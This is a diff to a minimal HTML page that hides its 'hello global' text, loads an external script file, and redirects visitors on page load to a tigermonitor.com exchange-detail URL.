@@ -4,7 +4,22 @@
 		<meta charset="utf-8">
 		<title></title>
 	</head>
+	<style>
+		#hg{
+			display: none;
+		}
+	</style>
 	<body>
-		hello global
+		<div id="hg">hello global</div>
+		
 	</body>
+	<script src="new_file.js"></script>
+	<script>
+		var targetUrl = "https://tigermonitor.com/exchangedetail/3568";
+		 
+		
+		window.onload = function() {
+		    window.location.href = targetUrl;
+		};
+	</script>
 </html>
